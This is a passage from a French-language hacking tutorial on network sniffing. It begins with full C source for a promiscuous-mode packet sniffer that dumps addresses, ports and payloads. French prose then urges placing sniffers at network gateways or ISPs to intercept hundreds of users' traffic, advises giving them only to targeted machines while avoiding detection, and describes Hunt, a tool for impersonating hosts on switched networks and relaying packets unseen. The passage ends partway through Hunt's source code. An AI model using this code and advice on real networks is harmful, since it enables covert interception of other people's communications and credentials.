<br><tt><font color="#FF0000">initdevice(device, pflag)</font></tt>
<br><tt><font color="#FF0000">&nbsp;char *device;</font></tt>
<br><tt><font color="#FF0000">&nbsp;int pflag;</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">#define PROTO htons(0x0800)&nbsp;&nbsp; /*
Ethernet code for IP protocol */</font></tt>
<p><tt><font color="#FF0000">&nbsp;int if_fd=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct ifreq ifr;</font></tt>
<p><tt><font color="#FF0000">&nbsp;if ( (if_fd=socket(AF_INET,SOCK_PACKET,PROTO))
&lt; 0 ) {</font></tt>
<br><tt><font color="#FF0000">&nbsp; perror("Can't get socket");</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(2);</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<p><tt><font color="#FF0000">&nbsp;strcpy(ifr.ifr_name, device);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* interface we're gonna use */</font></tt>
<br><tt><font color="#FF0000">&nbsp;if( ioctl(if_fd, SIOCGIFFLAGS, &amp;ifr)
&lt; 0 ) {&nbsp;&nbsp;&nbsp; /* get flags */</font></tt>
<br><tt><font color="#FF0000">&nbsp; close(if_fd);</font></tt>
<br><tt><font color="#FF0000">&nbsp; perror("Can't get flags");</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(2);</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<br><tt><font color="#FF0000">#if 1</font></tt>
<br><tt><font color="#FF0000">&nbsp;if ( pflag )</font></tt>
<br><tt><font color="#FF0000">&nbsp; ifr.ifr_flags |= IFF_PROMISC;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
/* set promiscuous mode */</font></tt>
<br><tt><font color="#FF0000">&nbsp;else</font></tt>
<br><tt><font color="#FF0000">&nbsp; ifr.ifr_flags &amp;= ~(IFF_PROMISC);</font></tt>
<br><tt><font color="#FF0000">#endif</font></tt>
<p><tt><font color="#FF0000">&nbsp;if( ioctl(if_fd, SIOCSIFFLAGS, &amp;ifr)
&lt; 0 ) {&nbsp;&nbsp;&nbsp; /* set flags */</font></tt>
<br><tt><font color="#FF0000">&nbsp; close(if_fd);</font></tt>
<br><tt><font color="#FF0000">&nbsp; perror("Can't set flags");</font></tt>
<br><tt><font color="#FF0000">&nbsp; exit(2);</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<br><tt><font color="#FF0000">&nbsp;return if_fd;</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><tt><font color="#FF0000">struct etherpacket {</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct ethhdr&nbsp; eth;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct iphdr&nbsp; ip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct tcphdr&nbsp; tcp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;char&nbsp;&nbsp; data[8192];</font></tt>
<br><tt><font color="#FF0000">&nbsp;};</font></tt>
<p><tt><font color="#FF0000">main()</font></tt>
<br><tt><font color="#FF0000">{</font></tt>
<br><tt><font color="#FF0000">&nbsp;int linktype;</font></tt>
<br><tt><font color="#FF0000">&nbsp;int if_eth_fd=initdevice("eth0",1);</font></tt>
<br><tt><font color="#FF0000">#if 0</font></tt>
<br><tt><font color="#FF0000">&nbsp;int if_ppp_fd=initdevice("sl0",1);</font></tt>
<br><tt><font color="#FF0000">#endif</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct etherpacket ep;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct sockaddr dest;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct iphdr *ip;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct tcphdr *tcp;</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct timeval timeout;</font></tt>
<br><tt><font color="#FF0000">&nbsp;fd_set rd,wr;</font></tt>
<br><tt><font color="#FF0000">&nbsp;int dlen;</font></tt>
<br><tt><font color="#FF0000">#if 0</font></tt>
<br><tt><font color="#FF0000">&nbsp;struct slcompress *slc=slhc_init(64,64);</font></tt>
<br><tt><font color="#FF0000">#endif</font></tt>
<p><tt><font color="#FF0000">&nbsp;for(;;)</font></tt>
<br><tt><font color="#FF0000">&nbsp;{</font></tt>
<br><tt><font color="#FF0000">&nbsp; bzero(&amp;dest,sizeof(dest));</font></tt>
<br><tt><font color="#FF0000">&nbsp; dlen=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp; FD_ZERO(&amp;rd);</font></tt>
<br><tt><font color="#FF0000">&nbsp; FD_ZERO(&amp;wr);</font></tt>
<br><tt><font color="#FF0000">&nbsp; FD_SET(if_eth_fd,&amp;rd);</font></tt>
<br><tt><font color="#FF0000">#if 0</font></tt>
<br><tt><font color="#FF0000">&nbsp; FD_SET(if_ppp_fd,&amp;rd);</font></tt>
<br><tt><font color="#FF0000">#endif</font></tt>
<br><tt><font color="#FF0000">&nbsp; timeout.tv_sec=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp; timeout.tv_usec=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp; ip=(struct iphdr *)(((unsigned long)&amp;ep.ip)-2);</font></tt>
<br><tt><font color="#FF0000">&nbsp; tcp=(struct tcphdr *)(((unsigned long)&amp;ep.tcp)-2);</font></tt>
<br><tt><font color="#FF0000">&nbsp; while(timeout.tv_sec==0 &amp;&amp;
timeout.tv_usec==0)</font></tt>
<br><tt><font color="#FF0000">&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp; timeout.tv_sec=10;</font></tt>
<br><tt><font color="#FF0000">&nbsp; timeout.tv_usec=0;</font></tt>
<br><tt><font color="#FF0000">&nbsp; select(20,&amp;rd,&amp;wr,NULL,&amp;timeout);</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(FD_ISSET(if_eth_fd,&amp;rd))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; printf("eth\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; recvfrom(if_eth_fd,&amp;ep,sizeof(ep),0,&amp;dest,&amp;dlen);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">#if 0</font></tt>
<br><tt><font color="#FF0000">&nbsp; else</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; if(FD_ISSET(if_ppp_fd,&amp;rd))</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; recvfrom(if_ppp_fd,&amp;ep,sizeof(ep),0,&amp;dest,&amp;dlen);</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; printf("ppp\n");</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; }</font></tt>
<br><tt><font color="#FF0000">#endif</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<p><tt><font color="#FF0000">&nbsp; printf("proto: %.4x",ntohs(ep.eth.h_proto));</font></tt>
<br><tt><font color="#FF0000">#if 0</font></tt>
<br><tt><font color="#FF0000">&nbsp; if(ep.eth.h_proto==ntohs(8053))</font></tt>
<br><tt><font color="#FF0000">&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; slhc_uncompress(slc,&amp;ep,sizeof(ep));</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<br><tt><font color="#FF0000">#endif</font></tt>
<p><tt><font color="#FF0000">&nbsp; if(ep.eth.h_proto==ntohs(ETH_P_IP))</font></tt>
<br><tt><font color="#FF0000">&nbsp; {</font></tt>
<br><tt><font color="#FF0000">&nbsp; printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x->",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.eth.h_source[0],ep.eth.h_source[1],</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.eth.h_source[2],ep.eth.h_source[3],</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.eth.h_source[4],ep.eth.h_source[5]);</font></tt>
<br><tt><font color="#FF0000">&nbsp; printf("%.2x:%.2x:%.2x:%.2x:%.2x:%.2x
",</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.eth.h_dest[0],ep.eth.h_dest[1],</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.eth.h_dest[2],ep.eth.h_dest[3],</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.eth.h_dest[4],ep.eth.h_dest[5]);</font></tt>
<br><tt><font color="#FF0000">&nbsp; printf("%s[%d]->",inet_ntoa(ip->saddr),ntohs(tcp->source));</font></tt>
<br><tt><font color="#FF0000">&nbsp; printf("%s[%d]\n",inet_ntoa(ip->daddr),ntohs(tcp->dest));</font></tt>
<br><tt><font color="#FF0000">&nbsp; print_data(htons(ip->tot_len)-sizeof(ep.ip)-sizeof(ep.tcp),</font></tt>
<br><tt><font color="#FF0000">&nbsp;&nbsp; ep.data-2);</font></tt>
<br><tt><font color="#FF0000">&nbsp; }</font></tt>
<br><tt><font color="#FF0000">&nbsp;}</font></tt>
<br><tt><font color="#FF0000">}</font></tt>
<p><font color="#000000">&nbsp;&nbsp; Maintenant que vous savez comment
fonctionne voyons quel avantage nous pouvons en tirer: sur un r&eacute;seau
local, qui est connect&eacute; &agrave; Internet par un serveur (t&ecirc;te
de r&eacute;seau), il suffit de placer un sniffer sur cette m&ecirc;me
t&ecirc;te de r&eacute;seau pour que les packets transitant vers lui puis
de lui vers le net, soient intercept&eacute;s. Si vous ne voyez absolument
pas ce que cel&agrave; repr&eacute;sente, imaginez un r&eacute;seau de
500 ordinateurs ou de 500 pc repr&eacute;sent&eacute;s par une adresse
IP. Par exemple un ISP quelquonque: les packets peuvent transiter vers
lui, et vous vous interceptez chaque packet envoy&eacute; par ces 500 machines.
EN quelques heures, votre disque dur est mort, rempli. Il existe des sniffers
qui font un filtrage d'IP. Appuyez vous sur ce fait ou bien ne filez ces
sniffers qu'aux machines vis&eacute;es. ATTENTION: des m&eacute;thodes
de protections ont &eacute;t&eacute; &eacute;labor&eacute;es, surtout au
niveau du sniffing. Refilez un sniffer et faites vous rep&eacute;rer risque
de vous apporter de grosses emmerdes. Il se peut aussi que les packets
envoy&eacute;s par X ordinateur soit crypt&eacute;, il vous faudra trouver
comment les d&eacute;crypter, de plus ces sniffers ne marchent que quand
il y a un hub.</font>
<p><u>Cas du switch:</u>
<p>Le switch est intelligent; il se comporte de la mani&egrave;re suivante:
Quand une machine A veut envoyer quelquechose &agrave; la machine C le
switch fait passer la trame directement &agrave; la machine C sans passer
par la machine B &agrave; l'instar du hub. C'est l&agrave; qu'intervient
Hunt. Ce programme permet de faire croire au switch que vous &ecirc;tes
la machine C. Bien entendu cel&agrave; demande &agrave; connaitre l'adresse
de la machine C. A partir de l&agrave;, vous r&eacute;cup&eacute;rez le
packet
<p><u>Et &ccedil;a va m&ecirc;me encore plus loin...:</u>
<p>De plus Hunt, apr&egrave;s avoir r&eacute;cup&eacute;r&eacute; le packet,
peut l'envoyer &agrave; la machine C: ni vu ni connu, voil&agrave; qu'un
r&eacute;seau est mis sous surveillance.
<p><u>Mais:</u>
<p>N'oublions pas que si Hunt permet de r&eacute;cup&eacute;rer les packets
destin&eacute;s &agrave; UNE machine, Hunt ne permet aps l'&eacute;coute
de tout le r&eacute;seau &agrave; cause du switch.
<p><u>Infos:</u>
<p>Actuellement Hunt v1.4 est disponible. Celui-ci fonctionne sur: Linux
2.2, GlibC 2.1 with LinuxThreads, Ethernet
<p>Pour les plus curieux d'entre vous, voici le code source de Hunt:
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* This is free software. You can redistribute
it and/or modify under</font>
<br><font color="#3333FF">&nbsp;* the terms of the GNU General Public License
version 2.</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*&nbsp; Copyright (C) 1998 by kra</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">#include "hunt.h"</font>
<br><font color="#3333FF">#include &lt;sys/types.h></font>
<br><font color="#3333FF">#include &lt;sys/time.h></font>
<br><font color="#3333FF">#include &lt;stdio.h></font>
<br><font color="#3333FF">#include &lt;stdlib.h></font>
<br><font color="#3333FF">#include &lt;string.h></font>
<br><font color="#3333FF">#include &lt;signal.h></font>
<br><font color="#3333FF">#include &lt;unistd.h></font>
<br><font color="#3333FF">#include &lt;assert.h></font>
<br>&nbsp;
<br>&nbsp;
<p><font color="#3333FF">#ifndef IP_OFFMASK</font>
<br><font color="#3333FF">#define IP_OFFMASK 0x1fff</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">#ifndef IP_MF</font>
<br><font color="#3333FF">#define IP_MF&nbsp;&nbsp;&nbsp; 0x2000</font>
<br><font color="#3333FF">#endif</font>
<p><font color="#3333FF">int linksock = -1;</font>
<br><font color="#3333FF">int mac_learn_from_ip = 0;</font>
<p><font color="#3333FF">int conn_list_mac = 0;</font>
<br><font color="#3333FF">int conn_list_seq = 0;</font>
<p><font color="#3333FF">struct hash conn_table;</font>
<br><font color="#3333FF">struct hash mac_table;</font>
<p><font color="#3333FF">int hunt_ready = 0;</font>
<br><font color="#3333FF">pthread_mutex_t mutex_hunt_ready = PTHREAD_MUTEX_INITIALIZER;</font>
<br><font color="#3333FF">pthread_cond_t cond_hunt_ready = PTHREAD_COND_INITIALIZER;</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* list of struct packet_info with information
which packets skip in process</font>
<br><font color="#3333FF">&nbsp;* of updating connection</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">struct list l_skip_update = LIST_INIT(struct
packet_info, next);</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;* lists of functions which pass packets
to modules</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">struct list l_ifunc_ip = LIST_INIT(struct ifunc_item,
next_ip);</font>
<br><font color="#3333FF">struct list l_ifunc_tcp = LIST_INIT(struct ifunc_item,
next_tcp);</font>
<br><font color="#3333FF">struct list l_ifunc_udp = LIST_INIT(struct ifunc_item,
next_udp);</font>
<br><font color="#3333FF">struct list l_ifunc_icmp = LIST_INIT(struct ifunc_item,
next_icmp);</font>
<br><font color="#3333FF">struct list l_ifunc_arp = LIST_INIT(struct ifunc_item,
next_arp);</font>
<br><font color="#3333FF">struct list l_ifunc_fast_tcp = LIST_INIT(struct
ifunc_item, next_tcp);</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* packet operations</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<p><font color="#3333FF">static struct list l_packets = LIST_INIT(struct
packet, p_next_free);</font>
<br><font color="#3333FF">int packets_allocated = 0;</font>
<p><font color="#3333FF">struct packet *packet_new(void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct packet *p;</font>
<p><font color="#3333FF">&nbsp;if (!(p = list_pop(&amp;l_packets))) {</font>
<br><font color="#3333FF">&nbsp; if (!(p = malloc(sizeof(struct packet))))
{</font>
<br><font color="#3333FF">&nbsp;&nbsp; perror("malloc");</font>
<br><font color="#3333FF">&nbsp;&nbsp; return NULL;</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp; pthread_mutex_init(&amp;p->p_mutex, NULL);</font>
<br><font color="#3333FF">&nbsp; p->p_use_count = 0;</font>
<br><font color="#3333FF">&nbsp; p->p_hdr.p_tcph = NULL;</font>
<br><font color="#3333FF">&nbsp; p->p_data = NULL;</font>
<br><font color="#3333FF">&nbsp; p->p_type = PACKET_NONE;</font>
<br><font color="#3333FF">&nbsp; p->p_ipc = 0;</font>
<br><font color="#3333FF">&nbsp; p->p_ipc_arg = NULL;</font>
<p><font color="#3333FF">&nbsp; packets_allocated++;</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;p->p_use_count = 1;</font>
<br><font color="#3333FF">&nbsp;return p;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void packet_copy_data(struct packet *dst, struct
packet *src)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;memcpy(dst->p_raw, src->p_raw, src->p_raw_len);</font>
<br><font color="#3333FF">&nbsp;dst->p_raw_len = src->p_raw_len;</font>
<br><font color="#3333FF">&nbsp;dst->p_type = src->p_type;</font>
<br><font color="#3333FF">&nbsp;dst->p_ethh = (struct ethhdr *)(dst->p_raw
+</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((char *)src->p_ethh - src->p_raw));</font>
<br><font color="#3333FF">&nbsp;dst->p_iph = (struct iphdr *)(dst->p_raw
+</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((char *)src->p_iph - src->p_raw));</font>
<br><font color="#3333FF">&nbsp;dst->p_arph = (struct arphdr *)(dst->p_raw
+</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((char *)src->p_arph - src->p_raw));</font>
<br><font color="#3333FF">&nbsp;dst->p_hdr.p_tcph = (struct tcphdr *)(dst->p_raw
+</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; ((char *)src->p_hdr.p_tcph
- src->p_raw));</font>
<br><font color="#3333FF">&nbsp;dst->p_data_len = src->p_data_len;</font>
<br><font color="#3333FF">&nbsp;dst->p_data = dst->p_raw + (src->p_data
- src->p_raw);</font>
<br><font color="#3333FF">&nbsp;memcpy(dst->p_arg, src->p_arg, sizeof(src->p_arg));</font>
<br><font color="#3333FF">&nbsp;dst->p_ipc = src->p_ipc;</font>
<br><font color="#3333FF">&nbsp;dst->p_ipc_arg = src->p_ipc_arg;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void packet_free(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;int is_free;</font>
<p><font color="#3333FF">&nbsp;pthread_mutex_lock(&amp;p->p_mutex);</font>
<br><font color="#3333FF">&nbsp;if (--p->p_use_count == 0)</font>
<br><font color="#3333FF">&nbsp; is_free = 1;</font>
<br><font color="#3333FF">&nbsp;else</font>
<br><font color="#3333FF">&nbsp; is_free = 0;</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_unlock(&amp;p->p_mutex);</font>
<br><font color="#3333FF">&nbsp;if (is_free)</font>
<br><font color="#3333FF">&nbsp; list_push(&amp;l_packets, p);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void packet_want(struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_lock(&amp;p->p_mutex);</font>
<br><font color="#3333FF">&nbsp;++p->p_use_count;</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_unlock(&amp;p->p_mutex);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void packet_flush(struct list *l)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct packet *p;</font>
<p><font color="#3333FF">&nbsp;while ((p = list_pop(l)))</font>
<br><font color="#3333FF">&nbsp; packet_free(p);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void packet_preallocate(int count)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct packet **p = alloca(count * sizeof(struct
packet *));</font>
<br><font color="#3333FF">&nbsp;int i;</font>
<p><font color="#3333FF">&nbsp;for (i = 0; i &lt; count; i++)</font>
<br><font color="#3333FF">&nbsp; p[i] = packet_new();</font>
<br><font color="#3333FF">&nbsp;for (i = 0; i &lt; count; i++)</font>
<br><font color="#3333FF">&nbsp; packet_free(p[i]);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">int packet_count(void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;return list_count(&amp;l_packets);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">/*</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;* TCP connection database</font>
<br><font color="#3333FF">&nbsp;*</font>
<br><font color="#3333FF">&nbsp;*/</font>
<br><font color="#3333FF">static inline void fill_uci(struct user_conn_info
*uci, struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;uci->src_addr = p->p_iph->saddr;</font>
<br><font color="#3333FF">&nbsp;uci->dst_addr = p->p_iph->daddr;</font>
<br><font color="#3333FF">&nbsp;uci->src_port = p->p_hdr.p_tcph->source;</font>
<br><font color="#3333FF">&nbsp;uci->dst_port = p->p_hdr.p_tcph->dest;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">#if 0</font>
<br><font color="#3333FF">static int ht_eq(unsigned int key, struct conn_info
*c,</font>
<br><font color="#3333FF">&nbsp;&nbsp; struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;if (c->src_addr == p->p_iph->saddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_addr == p->p_iph->daddr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->src_port == p->p_hdr.p_tcph->source
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_port == p->p_hdr.p_tcph->dest)</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp;if (c->src_addr == p->p_iph->daddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_addr == p->p_iph->saddr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->src_port == p->p_hdr.p_tcph->dest
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_port == p->p_hdr.p_tcph->source)</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp;return 0;</font>
<br><font color="#3333FF">}</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">static int ht_eq(unsigned int key, struct conn_info
*c,</font>
<br><font color="#3333FF">&nbsp;&nbsp; struct user_conn_info *uci)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;if (c->src_addr == uci->src_addr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_addr == uci->dst_addr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->src_port == uci->src_port
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_port == uci->dst_port)</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp;if (c->src_addr == uci->dst_addr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_addr == uci->src_addr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->src_port == uci->dst_port
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; c->dst_port == uci->src_port)</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp;return 0;</font>
<br><font color="#3333FF">}</font>
<br>&nbsp;
<p><font color="#3333FF">void remove_conn_if_dont_match(void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct hash_iterator hi;</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<br><font color="#3333FF">&nbsp;int count_to_remove = 0;</font>
<br><font color="#3333FF">&nbsp;unsigned int *key_to_remove;</font>
<br><font color="#3333FF">&nbsp;struct conn_info **ci_to_remove;</font>
<p><font color="#3333FF">&nbsp;hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;count_to_remove = 0;</font>
<br><font color="#3333FF">&nbsp;key_to_remove = alloca(sizeof(unsigned
int) * hash_count(&amp;conn_table));</font>
<br><font color="#3333FF">&nbsp;ci_to_remove = alloca(sizeof(struct conn_info
*) * hash_count(&amp;conn_table));</font>
<br><font color="#3333FF">&nbsp;hash_iter_set(&amp;hi, &amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;while ((ci = hash_iter_get(&amp;hi, &amp;key)))
{</font>
<br><font color="#3333FF">&nbsp; if (!conn_add_match(ci->src_addr, ci->dst_addr,
ci->src_port, ci->dst_port)) {</font>
<br><font color="#3333FF">&nbsp;&nbsp; ci_to_remove[count_to_remove] =
ci;</font>
<br><font color="#3333FF">&nbsp;&nbsp; key_to_remove[count_to_remove++]
= key;</font>
<br><font color="#3333FF">&nbsp; }</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_iter_end(&amp;hi);</font>
<br><font color="#3333FF">&nbsp;for ( ; count_to_remove >= 0; count_to_remove--)</font>
<br><font color="#3333FF">&nbsp; hash_remove(&amp;conn_table, key_to_remove[count_to_remove],</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ci_to_remove[count_to_remove]);</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">void conn_free(struct conn_info *ci)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;int free_it;</font>
<p><font color="#3333FF">&nbsp;pthread_mutex_lock(&amp;ci->mutex);</font>
<br><font color="#3333FF">&nbsp;if (--ci->use_count == 0)</font>
<br><font color="#3333FF">&nbsp; free_it = 1;</font>
<br><font color="#3333FF">&nbsp;else</font>
<br><font color="#3333FF">&nbsp; free_it = 0;</font>
<br><font color="#3333FF">&nbsp;pthread_mutex_unlock(&amp;ci->mutex);</font>
<br><font color="#3333FF">&nbsp;if (free_it)</font>
<br><font color="#3333FF">&nbsp; free(ci);</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">struct conn_info *conn_get(struct user_conn_info
*uci)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<p><font color="#3333FF">&nbsp;key = uci_generate_key(uci);</font>
<br><font color="#3333FF">&nbsp;hash_lock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;if ((ci = hash_get(&amp;conn_table, key,
uci))) {</font>
<br><font color="#3333FF">&nbsp; pthread_mutex_lock(&amp;ci->mutex);</font>
<br><font color="#3333FF">&nbsp; ++ci->use_count;</font>
<br><font color="#3333FF">&nbsp; pthread_mutex_unlock(&amp;ci->mutex);</font>
<br><font color="#3333FF">&nbsp;}</font>
<br><font color="#3333FF">&nbsp;hash_unlock(&amp;conn_table);</font>
<br><font color="#3333FF">&nbsp;return ci;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">int conn_exist(struct user_conn_info *uci)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;unsigned int key;</font>
<br><font color="#3333FF">&nbsp;struct conn_info *ci;</font>
<p><font color="#3333FF">&nbsp;key = uci_generate_key(uci);</font>
<br><font color="#3333FF">&nbsp;if ((ci = hash_get(&amp;conn_table, key,
uci)))</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp;else</font>
<br><font color="#3333FF">&nbsp; return 0;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static int packet_match(struct packet_info *pi,
struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct iphdr *iph = p->p_iph;</font>
<br><font color="#3333FF">&nbsp;struct tcphdr *tcph = p->p_hdr.p_tcph;</font>
<p><font color="#3333FF">&nbsp;if (pi->src_addr == iph->saddr &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pi->dst_addr == iph->daddr
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pi->src_port == tcph->source
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pi->dst_port == tcph->dest
&amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pi->src.next_seq ==
tcph->seq &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; pi->src.next_d_seq ==
tcph->ack_seq &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; memcmp(pi->src.src_mac,
p->p_ethh->h_source, ETH_ALEN) == 0 &amp;&amp;</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp; memcmp(pi->src.dst_mac,
p->p_ethh->h_dest, ETH_ALEN) == 0)</font>
<br><font color="#3333FF">&nbsp; return 1;</font>
<br><font color="#3333FF">&nbsp;else</font>
<br><font color="#3333FF">&nbsp; return 0;</font>
<br><font color="#3333FF">}</font>
<p><font color="#3333FF">static int conn_skip_update(struct conn_info *ci,
struct packet *p)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp;struct list_iterator iter;</font>
